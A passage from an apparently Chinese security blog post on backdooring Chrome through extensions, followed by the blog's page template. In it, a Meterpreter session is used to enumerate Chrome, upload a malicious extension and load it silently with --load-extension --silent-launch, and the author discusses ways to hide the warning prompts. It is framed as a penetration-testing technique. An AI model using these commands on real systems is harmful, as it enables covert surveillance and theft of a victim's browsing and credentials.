+<p>执行如下命令：<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="keyword">run</span><span class="bash"> post/windows/gather/enum_chrome</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/04/2028426856.png" alt="1459822340643.png"></p>
+<p>可以看到目标系统是安装了chrome浏览器的。</p>
+<p>上传插件目录demo到<code>e:\demo\</code> 目录，由于meterpreter的upload只能上传文件，不能上传文件夹，所以这里需要把demo文件夹打包压缩以后再上传，之后再通过目标系统的解压软件或者自己上传的unrar.exe进行解压，具体操作如下图:</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/04/3487428383.png" alt="1459823514157.png"></p>
+<p>使用如下命令寻找安装的解压软件：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/04/3309335995.png" alt="1459822825778.png"></p>
+<p>之后使用如下命令进行解压并删除压缩包，具体操作如下图：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/04/1685198453.png" alt="1459823776521.png"></p>
+<p>之后为chrome添加插件，使用如下命令：<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"C:<span class="symbol">\P</span>rogram Files (x86)<span class="symbol">\G</span>oogle<span class="symbol">\C</span>hrome<span class="symbol">\A</span>pplication<span class="symbol">\c</span>hrome.exe"  --load-extension="F:<span class="symbol">\d</span>emo<span class="symbol">\d</span>emo" --silent-launch</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>路径为chrome默认安装路径，如果找不到，可以使用dir命令来找，<code>--load-extension</code>是要加载的插件路径，<code>--silent-launch</code>表示不开启chrome，静默安装。注意：<code>需要在chrome未运行的情况下才可成功加载插件。</code></p>
+</blockquote>
+<p>使用以上命令有现在两点缺点：<br>缺点一，会有如下提示（过几秒会消失）。</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/04/416552522.png" alt="1459824615574.png"></p>
+<p>缺点二，有图标，有提示。</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/04/2208488495.png" alt="1459825110794.png"></p>
+<p>一直在想办法解决以上问题，图标可以换成透明的或者常用的插件图片来解决，另外两个暂时还没解决，详细的chrome命令可以参考这里: <a href="http://peter.sh/experiments/chromium-command-line-switches/" target="_blank" rel="noopener">chromium-command-line</a>，有小伙伴有了解决方案还请不吝赐教。当然也可以尝试写一个小程序来监控chrome，一旦chrome打开，则模拟点击事件点击取消按钮。</p>
+<blockquote>
+<p>最好的方式就是可以直接去为他安装插件，然后点了这几个提示之后，之后的使用则不会再次出现提示，这样可以隐藏挺长时间。</p>
+</blockquote>
+<p>然后，我就控制小明的所有访问内容了，就像这个图一样：</p>
+<p><img src="https://evi1cg.github.io/usr/uploads/2016/04/3707313364.png" alt="1459495933492.png"></p>
+<p>当然除了以上的利用方式，还可以通过发布一些插件让其含有攻击代码同样可以实现此功能。</p>
+<h2 id="0x04-How-to-Defend"><a href="#0x04-How-to-Defend" class="headerlink" title="0x04 How to Defend"></a>0x04 How to Defend</h2><p>对于不明来历的插件尽量不要安装，如果发现问题，请尽早修改自己各个账号密码。</p>
+<h2 id="0x05-Summarize"><a href="#0x05-Summarize" class="headerlink" title="0x05 Summarize"></a>0x05 Summarize</h2><p>此文主要介绍在渗透测试过程中的一种思路，有兴趣的小伙伴可以继续测试其他浏览器的插件，这种方式虽然简单，但是效果还不错，你值得拥有。以上文件可以通过这里下载：<a href="https://github.com/Ridter/Pentest/tree/master/backdoor/Extension_Backdoor" target="_blank" rel="noopener">Extension_Backdoor</a>。</p>
+<h2 id="0x06-Consult"><a href="#0x06-Consult" class="headerlink" title="0x06 Consult"></a>0x06 Consult</h2><p>1.<a href="http://peter.sh/experiments/chromium-command-line-switches/#condition-21" target="_blank" rel="noopener">http://peter.sh/experiments/chromium-command-line-switches/#condition-21</a><br>2.<a href="http://www.chromeplugins.org/google/chrome-plugins/installing-crx-file-command-line-9976.html" target="_blank" rel="noopener">http://www.chromeplugins.org/google/chrome-plugins/installing-crx-file-command-line-9976.html</a><br>3.<a href="https://developer.chrome.com/extensions/external_extensions" target="_blank" rel="noopener">https://developer.chrome.com/extensions/external_extensions</a><br>4.<a href="http://www.cnblogs.com/walkingp/archive/2011/03/31/2001628.html" target="_blank" rel="noopener">http://www.cnblogs.com/walkingp/archive/2011/03/31/2001628.html</a></p>
+
+      
+    </div>
+
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------本文结束，感谢阅读------</div>
+    
+</div>
+    
+    </div>
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Evi1cg</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://evi1cg.github.io/archives/Hack_With_Chrome_Extension.html" title="Hack With Chrome Extension">https://evi1cg.github.io/archives/Hack_With_Chrome_Extension.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/archives/creating-a-malicious-javascript-by-utilizing-alternate-data-streams.html" rel="next" title="使用文件流ADS 及 JavaScript 进行钓鱼攻击">
+                <i class="fa fa-chevron-left"></i> 使用文件流ADS 及 JavaScript 进行钓鱼攻击
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/archives/MS16-032-Windows-Privilege-Escalation.html" rel="prev" title="MS16-032 windows本地提权">
+                MS16-032 windows本地提权 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+
+      
+      
+    </footer>
+
+  
+    <br>
+    <div style="text-align:center" class="addthis_inline_share_toolbox">
+    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5c40967aab5e187f"></script>
+    </div>
+  
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+            
+            <a href="/">
+              <img class="site-author-image" itemprop="image" src="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif" alt="Evi1cg">
+            
+            </a>
+              <p class="site-author-name" itemprop="name">Evi1cg</p>
+              <p class="site-description motion-element" itemprop="description">此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archive">
+                
+                    <span class="site-state-item-count">98</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">51</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:zuotonghk@gmail.com" title="Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          <div id="days"></div>
+<script>
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("09/17/2015 15:13:14");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-Introduction"><span class="nav-number">1.</span> <span class="nav-text">0x00  Introduction</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Write-Chrome-Extension"><span class="nav-number">2.</span> <span class="nav-text">0x01 Write Chrome Extension</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-How-to-Hack"><span class="nav-number">3.</span> <span class="nav-text">0x02 How to Hack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、XSS-Platform"><span class="nav-number">3.1.</span> <span class="nav-text">1、XSS Platform</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、Keyloger"><span class="nav-number">3.2.</span> <span class="nav-text">2、Keyloger</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、ForceDownload"><span class="nav-number">3.3.</span> <span class="nav-text">3、ForceDownload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、Get-Wooyun-Password"><span class="nav-number">3.4.</span> <span class="nav-text">4、Get Wooyun Password</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-When-to-Use"><span class="nav-number">4.</span> <span class="nav-text">0x03 When to Use</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-How-to-Defend"><span class="nav-number">5.</span> <span class="nav-text">0x04 How to Defend</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Summarize"><span class="nav-number">6.</span> <span class="nav-text">0x05 Summarize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Consult"><span class="nav-number">7.</span> <span class="nav-text">0x06 Consult</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+    <div style="display: none;"><a href="https://www.whoxy.com/"><img src="//whoxy.s3.amazonaws.com/x.png" alt="whois api"></a></div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Evi1cg</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="//cdn.jsdelivr.net/npm/jquery@2/dist/jquery.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/fastclick@1/lib/fastclick.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/jquery-lazyload@1/jquery.lazyload.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
+
+  
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=6.7.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+  
+
+<script src="//cdn.jsdelivr.net/npm/leancloud-storage@3/dist/av-min.js"></script>
+
+
+
+  
+
+<script src="//cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: true,
+    notify: true,
+    appId: 's1f976yBJAt2jkwXyp1klYGM-gzGzoHsz',
+    appKey: 'aQhe3medX27hXiDgPHMCjzMB',
+    placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+    avatar: '',
+    meta: guest,
+    pageSize: '5' || 10,
+    visitor: false
+  });
+   //新增以下代码即可，可以移除.info下所有子节点。
+  var infoEle = document.querySelector('#comments .info');
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0){
+  infoEle.childNodes.forEach(function(item) {
+    item.parentNode.removeChild(item);
+  });}
+</script>
+
+
+
+
+  
+
+
+  
+
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+      }
+      else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  <script>
+    $('.highlight').each(function(i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap');
+      $(e).after($wrap);
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function(e) {
+        var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+          return $(e).text();
+        }).toArray().join('\n');
+        var ta = document.createElement('textarea');
+        var range = document.createRange(); //For Chrome
+        var sel = window.getSelection(); //For Chrome
+        var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+        ta.style.top = yPosition + 'px'; //Prevent page scroll
+        ta.style.position = 'absolute';
+        ta.style.opacity = '0';
+        ta.value = code;
+        ta.textContent = code; //For FireFox
+        ta.contentEditable = true;
+        ta.readOnly = false;
+        document.body.appendChild(ta);
+        range.selectNode(ta);
+        sel.removeAllRanges();
+        sel.addRange(range);
+        ta.setSelectionRange(0, code.length);
+        var result = document.execCommand('copy');
+        
+          if (result) $(this).text('复制成功');
+          else $(this).text('复制失败');
+        
+        ta.blur(); //For iOS
+        $(this).blur();
+      })).on('mouseleave', function(e) {
+        var $b = $(this).find('.copy-btn');
+        setTimeout(function() {
+          $b.text('复制');
+        }, 300);
+      }).append(e);
+    })
+  </script>
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+  <script>
+  $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
+  </script>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
+</html>
